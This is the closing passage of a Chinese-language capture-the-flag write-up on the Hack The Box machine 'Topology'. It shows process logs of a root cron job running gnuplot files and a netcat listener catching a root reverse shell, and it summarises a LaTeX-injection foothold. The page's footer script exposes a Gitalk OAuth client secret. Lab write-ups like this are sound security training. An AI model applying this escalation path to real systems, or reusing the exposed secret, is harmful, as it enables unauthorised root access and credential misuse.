<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">2023/07/15 06:25:01 CMD: UID=0     PID=1335   | /usr/sbin/CRON -f<br>2023/07/15 06:25:01 CMD: UID=0     PID=1340   | /bin/sh -c find <span class="hljs-string">&quot;/opt/gnuplot&quot;</span> -name <span class="hljs-string">&quot;*.plt&quot;</span> -<span class="hljs-built_in">exec</span> gnuplot &#123;&#125; \;<br>2023/07/15 06:25:01 CMD: UID=0     PID=1339   | /bin/sh -c find <span class="hljs-string">&quot;/opt/gnuplot&quot;</span> -name <span class="hljs-string">&quot;*.plt&quot;</span> -<span class="hljs-built_in">exec</span> gnuplot &#123;&#125; \;<br>2023/07/15 06:25:01 CMD: UID=0     PID=1338   | /usr/sbin/CRON -f<br>2023/07/15 06:25:01 CMD: UID=0     PID=1341   | find /opt/gnuplot -name *.plt -<span class="hljs-built_in">exec</span> gnuplot &#123;&#125; ;<br>2023/07/15 06:25:01 CMD: UID=0     PID=1342   | /bin/sh /opt/gnuplot/getdata.sh<br>2023/07/15 06:25:01 CMD: UID=0     PID=1347   | /usr/sbin/CRON -f<br></code></pre></td></tr></table></figure>

<p>我们可以看到，和预想的一摸一样 ，确实是自动执行gnuplot下的plt文件，那我们直接把payload丢进文件夹中等执行就好。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$sudo</span> nc -lvp 443<br>listening on [any] 443 ...<br>connect to [HTB-VPN-IP] from topology.htb [10.10.11.217] 34712<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (94662): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>root@topology:~<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure>

<p>成功拿到root权限，root flag在&#x2F;root目录下能找到。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这台机子主要考察了在被过滤情况下对Latex命令注入的理解以及对http网页权限验证文件的了解。提权部分比较的简单。</p>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/07/17/PC/">← Next [HTB]  PC</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/15/Pilgrimage/">[HTB]  Pilgrimage Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="gitalk-sel"></button></div><div id="gitalk"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Dr.T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#nmap"><span class="toc-number">2.1.</span> <span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nikto"><span class="toc-number">2.2.</span> <span class="toc-text">nikto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#whatweb"><span class="toc-number">2.3.</span> <span class="toc-text">whatweb</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web%E6%B8%97%E9%80%8F"><span class="toc-number">3.</span> <span class="toc-text">web渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%8E%A2%E6%9F%A5"><span class="toc-number">3.1.</span> <span class="toc-text">子域名探查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LaTex-Injection"><span class="toc-number">3.2.</span> <span class="toc-text">LaTex Injection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%AB%8B%E8%B6%B3%E7%82%B9"><span class="toc-number">3.3.</span> <span class="toc-text">获取立足点</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E4%B8%89%E6%A0%B7"><span class="toc-number">4.1.</span> <span class="toc-text">老三样</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linpeas"><span class="toc-number">4.2.</span> <span class="toc-text">linpeas</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#gunplot-exploit"><span class="toc-number">4.3.</span> <span class="toc-text">gunplot exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">总结</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plu</a></nobr><wbr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {gitalk = new Gitalk({
 clientID: 'd746fee266fd40784c87',
 clientSecret: '18467221d189fe0e0b51bd234fcd04785a28ab09',
 repo: 'T3yT3y.github.io',
 owner: 'T3yT3y',
 admin: ['T3yT3y'],
 distractionFreeMode: false,
 id: location.pathname
});
if (document.querySelector("#gitalk")) gitalk.render("gitalk");code.findCode();
document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>